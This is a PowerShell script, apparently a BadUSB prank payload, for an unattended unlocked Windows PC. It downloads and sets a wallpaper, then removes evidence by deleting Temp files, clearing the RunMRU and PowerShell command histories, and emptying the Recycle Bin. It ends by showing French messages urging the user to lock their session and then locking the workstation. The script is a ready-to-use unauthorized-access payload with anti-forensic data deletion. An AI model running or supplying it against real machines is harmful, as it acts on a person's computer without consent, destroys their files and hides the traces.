Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [Windows.Forms.Cursor]::Position.X

# Définir le chemin de l'image de fond d'écran
$wallpaperPath = "$env:USERPROFILE\Pictures\wallpaper.png"

# Télécharge l'image de fond d'écran depuis GitHub et la place dans le dossier Images
Invoke-WebRequest -Uri "https://github.com/MagikarpLv13/bad_usb_payloads/raw/master/ScreenChanger/wallpaper.png" -OutFile $wallpaperPath

# Change le fond d'écran de l'utilisateur
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
[Wallpaper]::SystemParametersInfo(0x0014, 0, $wallpaperPath, 0x0001)

# Supprime les traces du passage

# Supprime le conteu du dossier Temp
Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Supprime l'historique des commandes exécutées
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Supprime l'historique des commandes exécutées dans PowerShell
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Supprime le contenu de la poubelle
Clear-RecycleBin -Force -ErrorAction SilentlyContinu

# Créer un tableau de phrases
$messages = @(
    "Dis donc ? Tu es parti(e) en oubliant quelque chose..",
    "Verouiller sa session c'est important !",
    "Du coup je me suis permis de te le rappeler :)",
    "Mais ne t'inquiete pas, je veille sur toi..",
    "Le bon reflexe quand tu quitte ton poste, c'est la touche Windows + L !"
    "Allez, je te montre comment faire :D et HOP ! (bisous)"
)

# Initialiser le compteur
$counter = 0

while ($true) {
    $pauseTime = 1
    if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
        # Afficher le message dans le terminal
        if ($counter -lt $messages.Length) {
            $cmdProcess = Start-Process cmd -ArgumentList "/c echo $($messages[$counter]) & pause" -PassThru
            $counter++

            # Boucle pour attendre que la fenêtre CMD soit fermée
            while (!$cmdProcess.HasExited) {
                Start-Sleep -Milliseconds 500
            }
        }
        else {
            # Lorsque tous les messages ont étés affichés

            # Verrouiller la session utilisateur
            rundll32.exe user32.dll, LockWorkStation

            # Puis on sort de la boucle
            break
        }
    }
    else {
        Start-Sleep -Seconds $pauseTime
    }
}